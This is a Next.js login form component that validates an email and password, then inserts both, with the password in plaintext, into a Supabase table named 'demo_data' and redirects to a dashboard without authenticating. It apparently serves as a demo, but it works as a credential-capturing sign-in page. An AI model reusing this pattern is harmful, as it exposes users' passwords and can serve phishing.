"use client";

import Link from "next/link";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { useFormik } from "formik";
import * as Yup from "yup";
import { createClient } from "@/lib/supabase/client";

const validationSchema = Yup.object({
  email: Yup.string()
    .trim()
    .email("Enter a valid email address")
    .required("Email is required"),
  password: Yup.string()
    .min(8, "Password must be at least 8 characters")
    .required("Password is required"),
});

const inputClass =
  "w-full rounded-md border px-4 py-2 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-400";

const LoginForm = () => {
  const router = useRouter();
  const [show, setShow] = useState(false);
  const [status, setStatus] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);

  const formik = useFormik({
    initialValues: { email: "", password: "" },
    validationSchema,
    onSubmit: async (values, { resetForm }) => {
      setStatus(null);
      const supabase = createClient();
      const { error } = await supabase.from("demo_data").insert({
        email: values.email.trim(),
        password: values.password,
      });

      if (error) {
        setStatus({ type: "error", message: error.message });
        return;
      }
      sessionStorage.setItem("demo_email", values.email.trim());
      resetForm();
      router.push("/dashboard");
    },
  });

  const fieldError = (name: "email" | "password") =>
    formik.touched[name] && formik.errors[name] ? formik.errors[name] : null;

  return (
    <form className="mt-8 space-y-6" onSubmit={formik.handleSubmit} noValidate>
      <div className="space-y-2">
        <label htmlFor="email" className="block text-sm text-black">
          Email
        </label>
        <input
          id="email"
          type="email"
          placeholder="Your email"
          {...formik.getFieldProps("email")}
          className={`${inputClass} ${fieldError("email") ? "border-red-500" : "border-gray-300"}`}
        />
        {fieldError("email") && (
          <p className="text-xs text-red-600">{fieldError("email")}</p>
        )}
      </div>

      <div className="space-y-2">
        <label htmlFor="password" className="block text-sm text-black">
          Password
        </label>
        <div className="relative">
          <input
            id="password"
            type={show ? "text" : "password"}
            placeholder="Your password"
            {...formik.getFieldProps("password")}
            className={`${inputClass} pr-12 ${fieldError("password") ? "border-red-500" : "border-gray-300"}`}
          />
          <button
            type="button"
            onClick={() => setShow((s) => !s)}
            aria-label={show ? "Hide password" : "Show password"}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-700 hover:cursor-pointer"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="size-6"
            >
              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z" />
              <circle cx="12" cy="12" r="3" />
              {show && <path d="M3 3l18 18" />}
            </svg>
          </button>
        </div>
        {fieldError("password") && (
          <p className="text-xs text-red-600">{fieldError("password")}</p>
        )}
      </div>

      <div className="text-right">
        <Link
          href="/forgot-password"
          className="text-blue-600 text-sm hover:underline"
        >
          Forgot Password?
        </Link>
      </div>

      {status && (
        <p
          className={`text-sm ${status.type === "success" ? "text-green-600" : "text-red-600"}`}
          role="status"
        >
          {status.message}
        </p>
      )}

      <button
        type="submit"
        disabled={formik.isSubmitting}
        className="w-full rounded-md bg-[#1c2b36] py-2 text-md text-white transition-colors hover:bg-[#15212a] hover:cursor-pointer disabled:opacity-60 disabled:cursor-not-allowed"
      >
        {formik.isSubmitting ? "Submitting..." : "Sign In"}
      </button>
    </form>
  );
};

export default LoginForm;
